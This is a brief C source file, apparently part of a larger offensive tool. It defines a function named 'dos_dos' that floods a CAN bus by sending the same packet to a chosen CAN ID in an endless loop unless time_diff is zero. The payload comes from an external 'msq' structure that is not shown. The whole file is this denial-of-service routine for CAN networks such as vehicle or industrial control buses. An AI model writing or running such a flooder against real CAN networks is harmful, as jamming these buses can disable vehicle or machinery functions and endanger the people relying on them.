#include "all_headers.h"

void dos_dos(int socket, struct sockaddr_can *addr, int canid, int time_diff){
    do {
        send_can_packet(socket, addr, msq.payload1, msq.payload1_len, canid);
        if (time_diff == 0) break;
    } while (1);
}
